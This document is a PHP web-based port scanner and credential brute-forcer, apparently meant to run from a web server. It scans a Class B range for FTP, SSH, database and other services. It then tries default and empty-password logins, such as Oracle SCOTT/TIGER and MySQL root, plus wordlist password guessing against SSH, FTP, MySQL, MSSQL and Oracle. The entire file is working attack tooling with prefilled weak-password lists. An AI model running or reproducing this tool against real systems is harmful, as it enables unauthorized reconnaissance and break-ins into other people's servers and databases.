
<?php
 
#Class B PHP port scanner by anthrax @ insight-labs.org
session_start();
set_time_limit(0);
ob_implicit_flush(True);
ob_end_flush();
 
function check_port($ip,$port,$timeout=0.1) {
 $conn = @fsockopen($ip, $port, $errno, $errstr, $timeout);
 if ($conn) {
 fclose($conn);
 return true;
 }
}
function crackpwd($addr,$port,$userlist,$passlist,$type){
switch($type){
 
case 'ftp':
$ftp=@ftp_connect($addr,$port);
if(@ftp_login($ftp,'anonymous','safasf#asfs.com')){
echo "$addr".':'.$port.' Anonymous Login enabled'.'<br/>';
}
foreach($userlist as $username){
foreach($passlist as $pass){
if(@ftp_login($ftp,$username,$pass)){
echo "FTP $addr".':'.$port.'Username: '.$username.' pwd: '.$pass.'<br/>';
}
}
}
ftp_close($ftp);
break;
 
case 'mysql':
 
if(@mysql_connect($addr.':'.$port, 'root', '')){
echo 'MySQL Username: root EMPTY PASSWORD<br/>';
}
foreach($userlist as $username){
foreach($passlist as $pass){
if(@mysql_connect($addr.':'.$port, $username, $pass)){
echo 'MySQL Username: '.$username.' pwd: '.$pass.'<br/>';
}
}
}
break;
 
case 'mssql':
if(@mssql_connect($addr,'sa','')){
echo 'MSSQL Username: sa EMPTY PASSWORD<br/>';
}
foreach($userlist as $username){
foreach($passlist as $pass){
if(@mssql_connect($addr, $username, $pass)){
echo 'MSSQL Username: '.$username.' pwd: '.$pass.'<br/>';
}
}
}
break;
 
case 'oracle':
if(@oci_connect('SCOTT','TIGER',$addr)){
echo 'Oracle Username SCOTT pwd: TIGER';
}
if(@oci_connect('SYSTEM','MANAGER',$addr)){
echo 'Oracle Username SYSTEM pwd: MANAGER';
}
if(@oci_connect('DBSNMP','DBSNMP',$addr)){
echo 'Oracle Username DBSNMP pwd: DBSNMP';
}
foreach($userlist as $username){
foreach($passlist as $pass){
if(@oci_connect($username,$pass,$addr)){
echo 'Oracle Username: '.$username.' pwd: '.$pass.'<br/>';
}
}
}
break;
 
case 'ssh':
$ssh=@ssh2_connect($addr,'22');
foreach($userlist as $username){
foreach($passlist as $pass){
if(@ssh2_auth_password($ssh,$username,$pass)){
echo 'SSH Username: '.$username.' pwd: '.$pass.'<br/>';
}
}
}
break;
}
}
 
function scanip($ip,$timeout){
$portarr=array(
'21'=>'FTP',
'22'=>'SSH',
'23'=>'Telnet',
'25'=>'SMTP',
'79'=>'Finger',
'80'=>'HTTP',
'81'=>'HTTP/Proxy',
'110'=>'POP3',
'135'=>'MS Netbios',
'139'=>'MS Netbios',
'143'=>'IMAP',
'162'=>'SNMP',
'389'=>'LDAP',
'443'=>'HTTPS',
'445'=>'MS SMB',
'873'=>'rsync',
'1080'=>'Proxy/HTTP Server',
'1433'=>'MS SQL Server',
'2433'=>'MS SQL Server Hidden',
'1521'=>'Oracle DB Server',
'1522'=>'Oracle DB Server',
'3128'=>'Squid Cache Server',
'3129'=>'Squid Cache Server',
'3306'=>'MySQL Server',
'3307'=>'MySQL Server',
'3500'=>'Squid Cache Server',
'3389'=>'MS Terminal Service',
'5800'=>'VNC Server',
'5900'=>'VNC Server',
'8080'=>'Proxy/HTTP Server',
'10000'=>'Webmin',
'11211'=>'Memcached'
 
);
foreach($portarr as $port=>$name){
if(check_port($ip,$port,$timeout=0.1)==True){
echo 'Port: '.$port.' '.$name.' is open<br/>';
@ob_flush();
@flush();
 
if(isset($_SESSION['crack'])||$_SESSION['crack']==true){
switch($port){
 
case '21':
$type='ftp';
break;
 
case '22':
$type='ssh';
break;
 
case '1433':
$type='mssql';
break;
 
case '1521':
case '1522':
$type='oracle';
break;
 
case '3306':
case '3307':
$type='mysql';
break;
 
default:
$type=false;
}
if($type){
global $userarr,$passarr;
crackpwd($ip,$port,$userarr,$passarr,$type);
 
@ob_flush();
@flush();
}
 
}//if
}
}
}
 
if(!isset($_SESSION['startip'])){
$_SESSION['startip']='Start IP';
$_SESSION['endip']='End IP';
$_SESSION['username']='root
admin';
$_SESSION['password']='123456
root

admin
qwerty';
}
 
echo '<html>
<form action="" method="post">
<input type="text" name="startip" value="'.$_SESSION['startip'].'" />
<input type="text" name="endip" value="'.$_SESSION['endip'].'" />
Timeout<input type="text" name="timeout" value="0.1" /><br/>
Auto Crack Password on MSSQL,MYSQL,Oracle,SSH,FTP
<input type="checkbox" name="crack" value="Crack password"><br/>
<textarea rows="10" cols="30" name="username">'.$_SESSION['username'].'
</textarea>
<textarea rows="10" cols="30" name="password">'.$_SESSION['password'].'
</textarea><br/>
<button type="submit" name="submit">Scan</button>
</form>
</html>
';
if(isset($_POST['startip'])&&isset($_POST['endip'])&&isset($_POST['timeout'])){
if(isset($_POST['crack'])){
global $userarr,$passarr;
$_SESSION['crack']=true;
$userarr=array_unique(explode("\n",str_replace("\r", "", $_POST['username'])));
$passarr=array_unique (explode("\n",str_replace("\r", "", $_POST['password'])));
$_SESSION['username']=$_POST['username'];
$_SESSION['password']=$_POST['password'];
}
$startip=$_POST['startip'];
$endip=$_POST['endip'];
$timeout=$_POST['timeout'];
$siparr=explode('.',$startip);
$eiparr=explode('.',$endip);
$ciparr=$siparr;
if(count($ciparr)!=4||$siparr[0]!=$eiparr[0]||$siparr[1]!=$eiparr[1]){
exit('IP error: Wrong IP address or Trying to scan class A address');
}
$_SESSION['startip']=$startip;
$_SESSION['endip']=$endip;
if($startip==$endip){
echo 'Scanning IP '.$startip.'<br/>';
@ob_flush();
@flush();
scanip($startip,$timeout);
@ob_flush();
@flush();
exit();
}
 
if($eiparr[3]!=255){
$eiparr[3]+=1;
}
while($ciparr!=$eiparr){
$ip=$ciparr[0].'.'.$ciparr[1].'.'.$ciparr[2].'.'.$ciparr[3];
echo '<br/>Scanning IP '.$ip.'<br/>';
@ob_flush();
@flush();
scanip($ip,$timeout);
$ciparr[3]+=1;
 
if($ciparr[3]>255){
$ciparr[2]+=1;
$ciparr[3]=0;
}
if($ciparr[2]>255){
$ciparr[1]+=1;
$ciparr[2]=0;
}
}
}else{
exit('Missing input');
}
?>